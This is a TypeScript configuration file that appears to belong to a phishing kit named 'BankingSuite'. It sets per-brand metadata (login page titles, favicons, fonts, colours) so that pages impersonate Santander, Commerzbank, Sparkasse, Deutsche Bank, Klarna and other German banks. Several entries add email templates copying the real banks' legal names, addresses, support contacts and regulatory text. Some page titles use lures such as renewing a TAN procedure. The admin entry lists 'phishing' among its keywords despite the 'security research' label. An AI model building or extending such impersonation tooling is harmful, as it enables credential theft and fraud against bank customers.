interface TemplateMetadata {
  name: string;
  displayName: string;
  title: string;
  favicon: string;
  appleIcon?: string;
  themeColor: string;
  description: string;
  keywords: string;
  fonts: string[];
  brandColor: string;
  brandColorSecondary?: string;
  
  // Email-specific properties
  email?: {
    logoUrl: string;
    fontFamily: string;
    supportEmail: string;
    supportPhone: string;
    websiteUrl: string;
    legalName: string;
    address: {
      street: string;
      city: string;
      postalCode: string;
      country: string;
    };
    socialMedia?: {
      facebook?: string;
      twitter?: string;
      linkedin?: string;
      instagram?: string;
    };
    compliance: {
      regulatoryText: string;
      disclaimerText: string;
      privacyPolicyUrl: string;
      termsOfServiceUrl: string;
    };
  };
}

// Central template metadata configuration
export const TEMPLATE_METADATA: Record<string, TemplateMetadata> = {
  santander: {
    name: 'santander',
    displayName: 'Santander',
    title: 'Login MySantander',
    favicon: '/templates/santander/images/santander-favicon.ico',
    appleIcon: '/templates/santander/images/santander-favicon.ico',
    themeColor: '#9e3667',
    description: 'Santander Online Banking - Sicher einloggen',
    keywords: 'Santander, Online Banking, Login, Sicherheit',
    fonts: [
      '/templates/santander/fonts/SantanderText-Regular.bf509714.woff',
      '/templates/santander/fonts/SantanderText-Bold.d92c02b7.woff',
      '/templates/santander/fonts/SantanderHeadlineW05-Rg.a5ec6e62.woff',
      '/templates/santander/fonts/SantanderTextW05-Regular.746c91a0.woff'
    ],
    brandColor: '#9e3667',
    brandColorSecondary: '#ffffff'
  },
  
  commerzbank: {
    name: 'commerzbank',
    displayName: 'Commerzbank',
    title: 'Commerzbank Banking - Login',
    favicon: '/templates/commerzbank/images/commerzbank-favicon.ico',
    appleIcon: '/templates/commerzbank/images/commerzbank-favicon.ico',
    themeColor: '#002e3c',
    description: 'Commerzbank Online Banking - Sicher einloggen',
    keywords: 'Commerzbank, Online Banking, Login, Sicherheit',
    fonts: [
      '/templates/commerzbank/fonts/Gotham-Book.woff2',
      '/templates/commerzbank/fonts/Gotham-Medium.woff2',
      '/templates/commerzbank/fonts/Gotham-Bold.woff2',
      '/templates/commerzbank/fonts/Gotham-Light.woff2'
    ],
    brandColor: '#002e3c',
    brandColorSecondary: '#ffffff',
    email: {
      logoUrl: '/templates/commerzbank/images/commerzbank.svg',
      fontFamily: 'Gotham, Arial, sans-serif',
      supportEmail: 'service@commerzbank.de',
      supportPhone: '+49 69 136 20000',
      websiteUrl: 'https://www.commerzbank.de',
      legalName: 'Commerzbank AG',
      address: {
        street: 'Kaiserstraße 16',
        city: 'Frankfurt am Main',
        postalCode: '60311',
        country: 'Deutschland'
      },
      socialMedia: {
        facebook: 'https://www.facebook.com/commerzbank',
        twitter: 'https://twitter.com/commerzbank',
        linkedin: 'https://www.linkedin.com/company/commerzbank'
      },
      compliance: {
        regulatoryText: 'Commerzbank AG ist ein Kreditinstitut im Sinne des KWG.',
        disclaimerText: 'Diese E-Mail enthält vertrauliche Informationen. Bei versehentlichem Empfang bitten wir um Benachrichtigung und Löschung.',
        privacyPolicyUrl: 'https://www.commerzbank.de/de/hauptnavigation/datenschutz/datenschutz.html',
        termsOfServiceUrl: 'https://www.commerzbank.de/de/hauptnavigation/agb/agb.html'
      }
    }
  },
  
  sparkasse: {
    name: 'sparkasse',
    displayName: 'Sparkasse',
    title: 'Sparkasse Online-Banking - Anmeldung',
    favicon: '/templates/sparkasse/images/favicon2x.png',
    appleIcon: '/templates/sparkasse/images/apple-touch-icon.png',
    themeColor: '#ff0018',
    description: 'Sparkasse Online Banking - Sicher einloggen',
    keywords: 'Sparkasse, Online Banking, Login, Sicherheit',
    fonts: [
      '/templates/sparkasse/fonts/Sparkasse_web_Rg.woff',
      '/templates/sparkasse/fonts/Sparkasse_web_Md.woff',
      '/templates/sparkasse/fonts/Sparkasse_web_Bd.woff'
    ],
    brandColor: '#ff0018',
    brandColorSecondary: '#ffffff'
  },
  

  
  apobank: {
    name: 'apobank',
    displayName: 'apoBank',
    title: 'apoBank Online-Banking - Sicherheitsverifizierung',
    favicon: '/templates/apobank/images/apobank-logo.svg',
    appleIcon: '/templates/apobank/images/apobank-logo.svg',
    themeColor: '#012169',
    description: 'apoBank Online Banking für Gesundheitswesen - Sicher einloggen',
    keywords: 'apoBank, Online Banking, Login, Sicherheit, Gesundheitswesen',
    fonts: [
      '/templates/apobank/fonts/SourceSansPro-Regular.woff2',
      '/templates/apobank/fonts/SourceSansPro-Semibold.woff2',
      '/templates/apobank/fonts/SourceSansPro-Bold.woff2',
      '/templates/apobank/fonts/SourceSansPro-Light.woff2'
    ],
    brandColor: '#012169',
    brandColorSecondary: '#00a0e6'
  },

  postbank: {
    name: 'postbank',
    displayName: 'Postbank',
    title: 'Postbank Banking & Brokerage - Anmeldung',
    favicon: '/templates/postbank/images/postbank-logo.svg',
    appleIcon: '/templates/postbank/images/postbank-logo.svg',
    themeColor: '#fc0',
    description: 'Postbank Banking & Brokerage - Sicher anmelden',
    keywords: 'Postbank, Online Banking, Banking, Brokerage, Anmeldung, Sicherheit',
    fonts: [
      '/templates/postbank/fonts/FrutigerLTPro-Roman.woff2',
      '/templates/postbank/fonts/FrutigerLTPro-Bold.woff2',
      '/templates/postbank/fonts/FrutigerLTPro-Light.woff2'
    ],
    brandColor: '#fc0',
    brandColorSecondary: '#0018a8'
  },

  dkb: {
    name: 'dkb',
    displayName: 'DKB',
    title: 'DKB Banking - Login',
    favicon: '/templates/dkb/images/dkb-favicon.ico',
    appleIcon: '/templates/dkb/images/dkb-favicon.ico',
    themeColor: '#148DEA',
    description: 'DKB Online Banking - Sicher einloggen',
    keywords: 'DKB, Online Banking, Login, Sicherheit',
    fonts: [
      '/templates/dkb/fonts/DKBEuclid-Regular.woff2',
      '/templates/dkb/fonts/DKBEuclid-Medium.woff2',
      '/templates/dkb/fonts/DKBEuclid-Bold.woff2',
      '/templates/dkb/fonts/DKBEuclid-Semibold.woff2'
    ],
    brandColor: '#148DEA',
    brandColorSecondary: '#09141c'
  },

  volksbank: {
    name: 'volksbank',
    displayName: 'Volksbank',
    title: 'Volksbank Online-Banking - TAN-Verfahren erneuern',
    favicon: '/templates/volksbank/images/volksbank-logo.png',
    appleIcon: '/templates/volksbank/images/volksbank-logo.png',
    themeColor: '#003d7a',
    description: 'Volksbank Online Banking - TAN-Verfahren erneuern',
    keywords: 'Volksbank, Online Banking, TAN-Verfahren, Sicherheit',
    fonts: [
      '/templates/volksbank/fonts/Font_2.woff2',
      '/templates/volksbank/fonts/Font.woff2'
    ],
    brandColor: '#003d7a',
    brandColorSecondary: '#ffffff'
  },

  comdirect: {
    name: 'comdirect',
    displayName: 'comdirect',
    title: 'comdirect Online Banking - Login',
    favicon: '/templates/comdirect/images/comdirect-favicon.ico',
    appleIcon: '/templates/comdirect/images/comdirect-favicon.ico',
    themeColor: '#005ca9',
    description: 'comdirect Online Banking - Sicher einloggen',
    keywords: 'comdirect, Online Banking, Login, Sicherheit',
    fonts: [
      '/templates/comdirect/fonts/Comdirect-Regular.woff2',
      '/templates/comdirect/fonts/Comdirect-Medium.woff2',
      '/templates/comdirect/fonts/Comdirect-Bold.woff2'
    ],
    brandColor: '#005ca9',
    brandColorSecondary: '#ffffff'
  },

  consorsbank: {
    name: 'consorsbank',
    displayName: 'Consorsbank',
    title: 'Consorsbank - Anmeldung',
    favicon: '/templates/consorsbank/images/logo.svg',
    appleIcon: '/templates/consorsbank/images/logo.svg',
    themeColor: '#0080a6',
    description: 'Consorsbank Online Banking - Sicher anmelden',
    keywords: 'Consorsbank, Online Banking, Anmeldung, Wertpapierhandel, Sicherheit',
    fonts: [
      '/templates/consorsbank/fonts/Proxima_Vara.woff2',
      '/templates/consorsbank/fonts/Proxima_Vara_Italic.woff2'
    ],
    brandColor: '#0080a6',
    brandColorSecondary: '#ffffff'
  },

  ingdiba: {
    name: 'ingdiba',
    displayName: 'ING-DiBa',
    title: 'ING-DiBa Online Banking - Login',
    favicon: '/templates/ingdiba/images/logo.svg',
    appleIcon: '/templates/ingdiba/images/logo.svg',
    themeColor: '#ff6200',
    description: 'ING-DiBa Online Banking - Sicher einloggen',
    keywords: 'ING-DiBa, Online Banking, Login, Sicherheit',
    fonts: [
      '/templates/ingdiba/fonts/INGMe-Regular.woff2',
      '/templates/ingdiba/fonts/INGMe-Bold.woff2'
    ],
    brandColor: '#ff6200',
    brandColorSecondary: '#ffffff'
  },

  deutsche_bank: {
    name: 'deutsche_bank',
    displayName: 'Deutsche Bank',
    title: 'Login | Deutsche Bank Banking & Brokerage',
    favicon: '/templates/deutsche_bank/images/favicon.ico',
    appleIcon: '/templates/deutsche_bank/images/favicon.ico',
    themeColor: '#0550d1',
    description: 'Deutsche Bank Banking & Brokerage - Sicher einloggen',
    keywords: 'Deutsche Bank, Banking, Brokerage, Login, Sicherheit',
    fonts: [
      '/fonts/gotham/Gotham-Book.woff2',
      '/fonts/gotham/Gotham-Medium.woff2',
      '/fonts/gotham/Gotham-Bold.woff2'
    ],
    brandColor: '#0550d1',
    brandColorSecondary: '#1e2a78'
  },
  
  // Admin dashboard
  admin: {
    name: 'admin',
    displayName: 'BankingSuite Admin',
    title: 'BankingSuite v1.0 - Admin Dashboard',
    favicon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><defs><linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%23ef4444;stop-opacity:1" /><stop offset="100%" style="stop-color:%23dc2626;stop-opacity:1" /></linearGradient></defs><rect width="32" height="32" fill="url(%23grad)"/><path d="M16 8l-3 3h2v6h2v-6h2l-3-3zm-6 12h12v2H10v-2z" fill="white"/></svg>',
    appleIcon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><defs><linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%23ef4444;stop-opacity:1" /><stop offset="100%" style="stop-color:%23dc2626;stop-opacity:1" /></linearGradient></defs><rect width="32" height="32" fill="url(%23grad)"/><path d="M16 8l-3 3h2v6h2v-6h2l-3-3zm-6 12h12v2H10v-2z" fill="white"/></svg>',
    themeColor: '#ef4444',
    description: 'BankingSuite v1.0 - Professional Banking Security Research Platform',
    keywords: 'banking, security, research, phishing, admin, dashboard, suite',
    fonts: [
      '/fonts/gotham/Gotham-Book.woff2',
      '/fonts/gotham/Gotham-Medium.woff2',
      '/fonts/gotham/Gotham-Bold.woff2'
    ],
    brandColor: '#ef4444',
    brandColorSecondary: '#dc2626'
  },

  klarna: {
    name: 'klarna',
    displayName: 'Klarna',
    title: 'Klarna - Bezahlen Sie später',
    favicon: '/templates/klarna/images/favicon.ico',
    appleIcon: '/templates/klarna/images/appIcon.png',
    themeColor: '#ffb3c7',
    description: 'Klarna - Bezahlen Sie später mit Ihrer Bank',
    keywords: 'Klarna, Bezahlen, Banking, Später bezahlen, Gateway, Zahlungen',
    fonts: [
      '/templates/klarna/fonts/Klarna Text.woff2',
      '/templates/klarna/fonts/Klarna Title.woff2'
    ],
    brandColor: '#ffb3c7',
    brandColorSecondary: '#0a0a0a',
    
    email: {
      logoUrl: '/templates/klarna/images/klarna-logo.svg',
      fontFamily: 'Klarna Sans, Arial, sans-serif',
      supportEmail: 'support@klarna.com',
      supportPhone: '+49 221 669 501 00',
      websiteUrl: 'https://www.klarna.com/de',
      legalName: 'Klarna Bank AB',
      address: {
        street: 'Sveavägen 46',
        city: 'Stockholm',
        postalCode: '111 34',
        country: 'Schweden'
      },
      socialMedia: {
        facebook: 'https://www.facebook.com/KlarnaDE',
        twitter: 'https://twitter.com/klarna_de',
        instagram: 'https://www.instagram.com/klarna/'
      },
      compliance: {
        regulatoryText: 'Klarna Bank AB ist von der schwedischen Finanzaufsichtsbehörde (Finansinspektionen) zugelassen und reguliert.',
        disclaimerText: 'Klarna ist ein lizenzierter Zahlungsdienstleister. Alle Zahlungen werden sicher verarbeitet.',
        privacyPolicyUrl: 'https://www.klarna.com/de/datenschutz/',
        termsOfServiceUrl: 'https://www.klarna.com/de/nutzungsbedingungen/'
      }
    }
  },

  'credit-landing': {
    name: 'credit-landing',
    displayName: 'Klarna Kreditkarte',
    title: 'Klarna - Kreditkarte sofort beantragen',
    favicon: '/templates/klarna/images/favicon.ico',
    appleIcon: '/templates/klarna/images/appIcon.png',
    themeColor: '#ffb3c7',
    description: 'Klarna Kreditkarte - Sofortige Genehmigung und flexible Zahlungsoptionen',
    keywords: 'Klarna, Kreditkarte, sofort, beantragen, genehmigung, flexibel, zahlung',
    fonts: [
      '/templates/klarna/fonts/Klarna Text.woff2',
      '/templates/klarna/fonts/Klarna Title.woff2'
    ],
    brandColor: '#ffb3c7',
    brandColorSecondary: '#0a0a0a',
    
    email: {
      logoUrl: '/templates/klarna/images/klarna-logo.svg',
      fontFamily: 'Klarna Sans, Arial, sans-serif',
      supportEmail: 'support@klarna.com',
      supportPhone: '+49 221 669 501 00',
      websiteUrl: 'https://www.klarna.com/de',
      legalName: 'Klarna Bank AB',
      address: {
        street: 'Sveavägen 46',
        city: 'Stockholm',
        postalCode: '111 34',
        country: 'Schweden'
      },
      socialMedia: {
        facebook: 'https://www.facebook.com/KlarnaDE',
        twitter: 'https://twitter.com/klarna_de',
        instagram: 'https://www.instagram.com/klarna/'
      },
      compliance: {
        regulatoryText: 'Klarna Bank AB ist von der schwedischen Finanzaufsichtsbehörde (Finansinspektionen) zugelassen und reguliert.',
        disclaimerText: 'Klarna ist ein lizenzierter Zahlungsdienstleister. Alle Zahlungen werden sicher verarbeitet.',
        privacyPolicyUrl: 'https://www.klarna.com/de/datenschutz/',
        termsOfServiceUrl: 'https://www.klarna.com/de/nutzungsbedingungen/'
      }
    }
  },

  targobank: {
    name: 'targobank',
    displayName: 'TARGOBANK',
    title: 'Login Online Banking | TARGOBANK',
    favicon: '/images/targobank-icon-white.svg',
    appleIcon: '/images/targobank-icon-white.svg',
    themeColor: '#003366',
    description: 'TARGOBANK Online Banking - Melden Sie sich jetzt im Online Banking der TARGOBANK an.',
    keywords: 'TARGOBANK, Online Banking, Login, Sicherheit, Privatkunden',
    fonts: [
      '/fonts/TARGOBANK.woff2'
    ],
    brandColor: '#003366',
    brandColorSecondary: '#00b6ed',
    
    email: {
      logoUrl: '/images/targobank-logo.svg',
      fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
      supportEmail: 'service@targobank.de',
      supportPhone: '0211 - 900 20 111',
      websiteUrl: 'https://www.targobank.de',
      legalName: 'TARGOBANK AG',
      address: {
        street: 'Kasernenstraße 10',
        city: 'Düsseldorf',
        postalCode: '40213',
        country: 'Deutschland'
      },
      socialMedia: {
        facebook: 'https://www.facebook.com/targobank',
        twitter: 'https://twitter.com/targobank'
      },
      compliance: {
        regulatoryText: 'TARGOBANK AG ist ein Kreditinstitut im Sinne des KWG, reguliert durch die BaFin.',
        disclaimerText: 'Diese E-Mail enthält vertrauliche Informationen. Bei versehentlichem Empfang bitten wir um Benachrichtigung und Löschung.',
        privacyPolicyUrl: 'https://www.targobank.de/de/datenschutz.html',
        termsOfServiceUrl: 'https://www.targobank.de/de/agb.html'
      }
    }
  }
};

// Default metadata for unknown templates
export const DEFAULT_METADATA: TemplateMetadata = {
  name: 'default',
  displayName: 'Banking Template',
  title: 'Online Banking - Login',
  favicon: 'data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==', // Blank transparent favicon  
  themeColor: '#003366',
  description: 'Online Banking Portal',
  keywords: 'banking, login, secure',
  fonts: [],
  brandColor: '#003366'
};

/**
 * Get template metadata by name
 */
export function getTemplateMetadata(templateName: string): TemplateMetadata {
  const normalizedName = templateName.toLowerCase().replace(/[^a-z0-9]/g, '_');
  return TEMPLATE_METADATA[normalizedName] || DEFAULT_METADATA;
}

/**
 * Update document title and meta tags
 */
export function updatePageMetadata(metadata: TemplateMetadata): void {
  // Update page title
  document.title = metadata.title;
  
  // Update or create meta tags
  updateMetaTag('description', metadata.description);
  updateMetaTag('keywords', metadata.keywords);
  updateMetaTag('theme-color', metadata.themeColor);
  
  // Update favicon
  updateFavicon(metadata.favicon);
  
  // Update apple touch icon if available
  if (metadata.appleIcon) {
    updateAppleTouchIcon(metadata.appleIcon);
  }
}

/**
 * Update or create a meta tag
 */
function updateMetaTag(name: string, content: string): void {
  let meta = document.querySelector(`meta[name="${name}"]`) as HTMLMetaElement;
  
  if (!meta) {
    meta = document.createElement('meta');
    meta.name = name;
    document.head.appendChild(meta);
  }
  
  meta.content = content;
}

/**
 * Update favicon
 */
function updateFavicon(href: string): void {
  // Remove existing favicon links
  const existingFavicons = document.querySelectorAll('link[rel*="icon"]');
  existingFavicons.forEach(link => link.remove());
  
  // Add new favicon
  const favicon = document.createElement('link');
  favicon.rel = 'icon';
  favicon.type = 'image/x-icon';
  favicon.href = href;
  document.head.appendChild(favicon);
  
  // Also add shortcut icon for better browser support
  const shortcutIcon = document.createElement('link');
  shortcutIcon.rel = 'shortcut icon';
  shortcutIcon.type = 'image/x-icon';
  shortcutIcon.href = href;
  document.head.appendChild(shortcutIcon);
}

/**
 * Update apple touch icon
 */
function updateAppleTouchIcon(href: string): void {
  // Remove existing apple touch icons
  const existingIcons = document.querySelectorAll('link[rel="apple-touch-icon"]');
  existingIcons.forEach(link => link.remove());
  
  // Add new apple touch icon
  const appleIcon = document.createElement('link');
  appleIcon.rel = 'apple-touch-icon';
  appleIcon.href = href;
  document.head.appendChild(appleIcon);
}

/**
 * Get template name from current URL path
 */
export function getTemplateNameFromPath(): string {
  const path = window.location.pathname;
  
  // Admin routes
  if (path.startsWith('/admin') || path.startsWith('/login')) {
    return 'admin';
  }
  
  // Template routes
  const templateMatch = path.match(/^\/([^\/]+)/);
  if (templateMatch) {
    return templateMatch[1];
  }
  
  return 'admin'; // Default to admin
}

/**
 * Auto-update metadata based on current route
 */
export function autoUpdateMetadata(): void {
  const templateName = getTemplateNameFromPath();
  const metadata = getTemplateMetadata(templateName);
  updatePageMetadata(metadata);
}

/**
 * Early initialization that runs immediately when script loads
 * This prevents the flash of wrong title/favicon
 */
export function earlyInitMetadata(): void {
  // Update metadata immediately, even before DOM is ready
  const templateName = getTemplateNameFromPath();
  const metadata = getTemplateMetadata(templateName);
  
  // Update title immediately
  document.title = metadata.title;
  
  // Update favicon immediately if DOM is ready
  if (document.head) {
    updateFavicon(metadata.favicon);
    if (metadata.appleIcon) {
      updateAppleTouchIcon(metadata.appleIcon);
    }
  }
  
  // Also run full update when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      autoUpdateMetadata();
    });
  } else {
    autoUpdateMetadata();
  }
}

/**
 * Hook for React components to use template metadata
 */
export function useTemplateMetadata(templateName?: string) {
  const name = templateName || getTemplateNameFromPath();
  return getTemplateMetadata(name);
} 